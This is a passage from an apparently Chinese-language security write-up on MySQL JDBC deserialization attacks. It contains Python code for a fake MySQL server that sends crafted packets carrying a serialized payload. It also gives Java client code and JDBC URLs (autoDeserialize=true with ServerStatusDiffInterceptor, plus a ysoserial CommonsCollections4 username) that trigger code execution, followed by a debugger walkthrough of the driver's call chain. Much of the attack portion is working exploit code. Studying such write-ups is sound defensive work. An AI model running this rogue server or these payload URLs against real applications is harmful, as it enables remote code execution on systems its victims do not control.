ce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                //获取payload</span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                //计算payload长度</span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                //计算数据包长度</span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3309</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;<span class="comment">//8.x使用</span></span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DB_URL);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>准备如上即可弹出计算机：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678447663038-860cb929-84aa-4d42-a406-99090a853b6a.png#averageHue=%2335352e&clientId=uac311049-55c2-4&from=paste&height=691&id=uf24a2d82&name=image.png&originHeight=864&originWidth=2142&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2523824&status=done&style=none&taskId=ud094e7f2-18d3-4b3c-87d9-6f859c5ef33&title=&width=1713.6" alt="image.png"><br>看看调试流程：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510110834-b835b9ac-4f5f-43f1-914c-38fe86403287.png#averageHue=%23292b28&clientId=u79845661-19e7-4&from=paste&height=890&id=u7e7a8657&name=image.png&originHeight=1112&originWidth=2022&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2828403&status=done&style=none&taskId=u25ae360a-523b-41c2-87e7-5138b50cf35&title=&width=1617.6" alt="image.png"><br>跟进getConnection<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510126283-c08ab339-6659-436c-88ad-5313a14f7352.png#averageHue=%232d312a&clientId=u79845661-19e7-4&from=paste&height=382&id=u7b661b66&name=image.png&originHeight=477&originWidth=1579&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1050941&status=done&style=none&taskId=u4f96dc59-c0f9-4d85-b889-4bc14fe2847&title=&width=1263.2" alt="image.png"><br>调用了另一个getConnection，跟进<br> <img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510228483-d0807043-6bbf-466b-9655-ab30350d9840.png#averageHue=%23282a29&clientId=u79845661-19e7-4&from=paste&height=336&id=u3c81b711&name=image.png&originHeight=420&originWidth=1869&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1052259&status=done&style=none&taskId=u58c81536-65a0-450c-8447-ede5ab457a5&title=&width=1495.2" alt="image.png"><br>进入connect方法，参数啥还是没变<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510251195-c6460c8c-a254-4751-aae1-b3f2e8664978.png#averageHue=%23282926&clientId=u79845661-19e7-4&from=paste&height=566&id=uf54be5ff&name=image.png&originHeight=708&originWidth=1774&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1680410&status=done&style=none&taskId=ued94a3f0-29cf-4053-b07f-a910f12a1c8&title=&width=1419.2" alt="image.png"><br>进入getInstance方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510281818-e40c6fb8-cf80-484c-a6e9-2ebee0489b74.png#averageHue=%232a2b28&clientId=u79845661-19e7-4&from=paste&height=723&id=ue89f3fb1&name=image.png&originHeight=904&originWidth=1452&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1735889&status=done&style=none&taskId=u20ecb35f-72b4-4215-b4e9-fea7f235495&title=&width=1161.6" alt="image.png"><br>调用ConnectionImpl，参数就是evil mysql的一些参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConnectionImpl</span><span class="params">(HostInfo hostInfo)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Stash away for later, used to clone this connection for Statement.cancel and Statement.setQueryTimeout().</span></span><br><span class="line">            <span class="built_in">this</span>.origHostInfo = hostInfo;</span><br><span class="line">            <span class="built_in">this</span>.origHostToConnectTo = hostInfo.getHost();</span><br><span class="line">            <span class="built_in">this</span>.origPortToConnectTo = hostInfo.getPort();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.database = hostInfo.getDatabase();</span><br><span class="line">            <span class="built_in">this</span>.user = StringUtils.isNullOrEmpty(hostInfo.getUser()) ? <span class="string">&quot;&quot;</span> : hostInfo.getUser();</span><br><span class="line">            <span class="built_in">this</span>.password = StringUtils.isNullOrEmpty(hostInfo.getPassword()) ? <span class="string">&quot;&quot;</span> : hostInfo.getPassword();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.props = hostInfo.exposeAsProperties();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.propertySet = <span class="keyword">new</span> <span class="title class_">JdbcPropertySetImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.propertySet.initializeProperties(<span class="built_in">this</span>.props);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// We need Session ASAP to get access to central driver functionality</span></span><br><span class="line">            <span class="built_in">this</span>.nullStatementResultSetFactory = <span class="keyword">new</span> <span class="title class_">ResultSetFactory</span>(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.session = <span class="keyword">new</span> <span class="title class_">NativeSession</span>(hostInfo, <span class="built_in">this</span>.propertySet);</span><br><span class="line">            <span class="built_in">this</span>.session.addListener(<span class="built_in">this</span>); <span class="comment">// listen for session status changes</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// we can&#x27;t cache fixed values here because properties are still not initialized with user provided values</span></span><br><span class="line">            <span class="built_in">this</span>.autoReconnectForPools = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_autoReconnectForPools);</span><br><span class="line">            <span class="built_in">this</span>.cachePrepStmts = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_cachePrepStmts);</span><br><span class="line">            <span class="built_in">this</span>.autoReconnect = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_autoReconnect);</span><br><span class="line">            <span class="built_in">this</span>.useUsageAdvisor = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_useUsageAdvisor);</span><br><span class="line">            <span class="built_in">this</span>.reconnectAtTxEnd = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_reconnectAtTxEnd);</span><br><span class="line">            <span class="built_in">this</span>.emulateUnsupportedPstmts = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_emulateUnsupportedPstmts);</span><br><span class="line">            <span class="built_in">this</span>.ignoreNonTxTables = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_ignoreNonTxTables);</span><br><span class="line">            <span class="built_in">this</span>.pedantic = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_pedantic);</span><br><span class="line">            <span class="built_in">this</span>.prepStmtCacheSqlLimit = <span class="built_in">this</span>.propertySet.getIntegerProperty(PropertyDefinitions.PNAME_prepStmtCacheSqlLimit);</span><br><span class="line">            <span class="built_in">this</span>.useLocalSessionState = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_useLocalSessionState);</span><br><span class="line">            <span class="built_in">this</span>.useServerPrepStmts = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_useServerPrepStmts);</span><br><span class="line">            <span class="built_in">this</span>.processEscapeCodesForPrepStmts = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_processEscapeCodesForPrepStmts);</span><br><span class="line">            <span class="built_in">this</span>.useLocalTransactionState = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_useLocalTransactionState);</span><br><span class="line">            <span class="built_in">this</span>.disconnectOnExpiredPasswords = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_disconnectOnExpiredPasswords);</span><br><span class="line">            <span class="built_in">this</span>.readOnlyPropagatesToServer = <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_readOnlyPropagatesToServer);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">exceptionInterceptorClasses</span> <span class="operator">=</span> <span class="built_in">this</span>.propertySet.getStringProperty(PropertyDefinitions.PNAME_exceptionInterceptors).getStringValue();</span><br><span class="line">            <span class="keyword">if</span> (exceptionInterceptorClasses != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(exceptionInterceptorClasses)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.exceptionInterceptor = <span class="keyword">new</span> <span class="title class_">ExceptionInterceptorChain</span>(exceptionInterceptorClasses, <span class="built_in">this</span>.props, <span class="built_in">this</span>.session.getLog());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.cachePrepStmts.getValue()) &#123;</span><br><span class="line">                createPreparedStatementCaches();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_cacheCallableStmts).getValue()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.parsedCallableStatementCache = <span class="keyword">new</span> <span class="title class_">LRUCache</span>&lt;&gt;(</span><br><span class="line">                        <span class="built_in">this</span>.propertySet.getIntegerProperty(PropertyDefinitions.PNAME_callableStmtCacheSize).getValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_allowMultiQueries).getValue()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.propertySet.getProperty(PropertyDefinitions.PNAME_cacheResultSetMetadata).setValue(<span class="literal">false</span>); <span class="comment">// we don&#x27;t handle this yet</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_cacheResultSetMetadata).getValue()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.resultSetMetadataCache = <span class="keyword">new</span> <span class="title class_">LRUCache</span>&lt;&gt;(<span class="built_in">this</span>.propertySet.getIntegerProperty(PropertyDefinitions.PNAME_metadataCacheSize).getValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.propertySet.getStringProperty(PropertyDefinitions.PNAME_socksProxyHost).getStringValue() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.propertySet.getProperty(PropertyDefinitions.PNAME_socketFactory).setValue(SocksProxySocketFactory.class.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.pointOfOrigin = <span class="built_in">this</span>.useUsageAdvisor.getValue() ? LogUtils.findCallingClassAndMethod(<span class="keyword">new</span> <span class="title class_">Throwable</span>()) : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.dbmd = getMetaData(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            initializeSafeQueryInterceptors();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (CJException e1) &#123;</span><br><span class="line">            <span class="keyword">throw</span> SQLExceptionsMapping.translateException(e1, getExceptionInterceptor());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createNewIO(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            unSafeQueryInterceptors();</span><br><span class="line"></span><br><span class="line">            NonRegisteringDriver.trackConnection(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">            cleanup(ex);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// don&#x27;t clobber SQL exceptions</span></span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            cleanup(ex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> SQLError</span><br><span class="line">                    .createSQLException(</span><br><span class="line">                            <span class="built_in">this</span>.propertySet.getBooleanProperty(PropertyDefinitions.PNAME_paranoid).getValue() ? Messages.getString(<span class="string">&quot;Connection.0&quot;</span>)</span><br><span class="line">                                    : Messages.getString(<span class="string">&quot;Connection.1&quot;</span>,</span><br><span class="line">                                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="built_in">this</span>.session.getHostInfo().getHost(), <span class="built_in">this</span>.session.getHostInfo().getPort() &#125;),</span><br><span class="line">                            MysqlErrorNumbers.SQL_STATE_COMMUNICATION_LINK_FAILURE, ex, getExceptionInterceptor());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里面有点长，也就是<code>ConnectionImpl</code>这里和其他版本有所不同，在这里首先会进入<code>initializeSafeQueryInterceptors();</code>初始化请求监听器，然后再到<code>createNewIO(false)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510645294-e0c7a9e2-7cf9-4fad-8cf3-6bb076407c5c.png#averageHue=%232a2b27&clientId=u79845661-19e7-4&from=paste&height=622&id=ueaaf0335&name=image.png&originHeight=777&originWidth=1573&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1624890&status=done&style=none&taskId=uf09dbf08-2efb-420f-99eb-cfc824c2585&title=&width=1258.4" alt="image.png"><br>调用<code>connectOneTryOnly</code>参数为false，跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510834424-aa564f8d-bef8-47c2-ad16-38ace0826de5.png#averageHue=%232d2d29&clientId=u79845661-19e7-4&from=paste&height=380&id=ucde86646&name=image.png&originHeight=475&originWidth=1648&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1094243&status=done&style=none&taskId=uee27c4e7-e86d-4973-bec3-914f049c11a&title=&width=1318.4" alt="image.png"><br>继续初始化initializePropsFromServer();<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510849651-fecdd605-4e1a-4917-9122-51d595217fd7.png#averageHue=%23242623&clientId=u79845661-19e7-4&from=paste&height=103&id=u629df3fd&name=image.png&originHeight=129&originWidth=753&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=131190&status=done&style=none&taskId=u1dd50109-bfe3-46a8-87aa-009c9469c5e&title=&width=602.4" alt="image.png"><br>在里面又调用了<code>handleAutoCommitDefaults()</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510868911-1a47e265-6103-432b-b5ed-a46bb0dc927e.png#averageHue=%232d2e2a&clientId=u79845661-19e7-4&from=paste&height=148&id=u0b858a61&name=image.png&originHeight=185&originWidth=946&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=248559&status=done&style=none&taskId=ufc17b21f-b711-4a1b-a492-2e33cd41240&title=&width=756.8" alt="image.png"><br>调用setAutoCommit设为true<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510890738-2782cc7c-62f1-4daa-a0f1-9ae2b8aa4378.png#averageHue=%23282a26&clientId=u79845661-19e7-4&from=paste&height=622&id=u656af38c&name=image.png&originHeight=778&originWidth=1689&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1712913&status=done&style=none&taskId=uc1a80241-79b5-43cb-80d8-8d95ffa3ab5&title=&width=1351.2" alt="image.png"><br>调用execSQL执行SQL语句，下面就进入主要逻辑了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510906326-8d664303-da9e-428b-8c8a-0de39f880596.png#averageHue=%232e2e2a&clientId=u79845661-19e7-4&from=paste&height=199&id=ua064bf25&name=image.png&originHeight=249&originWidth=1574&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=555260&status=done&style=none&taskId=u9fd0e0f9-c08b-431f-a4e9-03a3af8d87e&title=&width=1259.2" alt="image.png"><br>发送SQL请求数据包<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510933121-813b5bbf-782f-4068-a726-71157296c653.png#averageHue=%232e2f2c&clientId=u79845661-19e7-4&from=paste&height=127&id=u85695d6c&name=image.png&originHeight=159&originWidth=1682&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=372987&status=done&style=none&taskId=u282b97a7-9bb9-410e-861e-4a723c4f848&title=&width=1345.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510963952-a9696efc-1079-4450-9311-69a649828d34.png#averageHue=%23282a27&clientId=u79845661-19e7-4&from=paste&height=901&id=uffdf8f1a&name=image.png&originHeight=1126&originWidth=1989&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2900775&status=done&style=none&taskId=udddcd2a7-7bfa-4742-b6b6-7f194382c0b&title=&width=1591.2" alt="image.png"><br>调用<code>invokeQueryInterceptorsPre</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678510990356-fce8df9d-97c9-41bd-9b65-8003dae111aa.png#averageHue=%23282927&clientId=u79845661-19e7-4&from=paste&height=766&id=ube4b0d8e&name=image.png&originHeight=958&originWidth=1941&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2401376&status=done&style=none&taskId=ua02f0e13-0c8a-42c7-b804-7985b0b3872&title=&width=1552.8" alt="image.png"><br>调用了preProcess函数，参数sql就是查询语句设置autocommit自动提交为true<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678511090348-08e7cf45-0962-41f4-9b4f-7af9dcab7046.png#averageHue=%232a2b27&clientId=u79845661-19e7-4&from=paste&height=118&id=ub3fa02cc&name=image.png&originHeight=147&originWidth=1096&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=229800&status=done&style=none&taskId=ube40cce5-07f5-4c28-903b-4ae8e5a4e06&title=&width=876.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678511098889-68ad8d19-1318-410e-be2b-0ea6cc26c37d.png#averageHue=%23272723&clientId=u79845661-19e7-4&from=paste&height=158&id=u84ab1ee5&name=image.png&originHeight=198&originWidth=1166&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=316588&status=done&style=none&taskId=u37673b26-9004-46c0-93d8-0fdcd435d68&title=&width=932.8" alt="image.png"><br>就问你pupulateMap这东西你熟悉不熟悉吧，在一开始见到了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678511127418-08add209-9c2d-482e-9d59-e15ee034fc92.png#averageHue=%232f2f2a&clientId=u79845661-19e7-4&from=paste&height=274&id=ubbfd4428&name=image.png&originHeight=342&originWidth=1470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=704322&status=done&style=none&taskId=uc5f31e81-6bcf-472d-a67d-3da087e0099&title=&width=1176" alt="image.png"><br>调用<code>ResultSetUtil.resultSetToMap(toPopulate, rs)</code><br>这里的rs就是恶意的SQL服务端返回的数据<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678511168728-e77a0140-96b9-498c-b1b9-22bc45c916e2.png#averageHue=%23353632&clientId=u79845661-19e7-4&from=paste&height=130&id=uda837a67&name=image.png&originHeight=163&originWidth=1076&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=263211&status=done&style=none&taskId=u5e42f20b-db71-45d5-846c-700f88289a1&title=&width=860.8" alt="image.png"><br>然后就是调用getObject进行反序列化，这就是最开始分析的一条链子，这里的jdbc版本是8,低版本大致流程也是这样，只有少数异同点，但最后都是进入getObject方法触发反序列化</p>
<h2 id="（2）5-1-0-5-1-10"><a href="#（2）5-1-0-5-1-10" class="headerlink" title="（2）5.1.0-5.1.10"></a>（2）5.1.0-5.1.10</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="comment">//执行查询操作，返回的是数据库结果集的数据表</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure>
<p>payload如上</p>
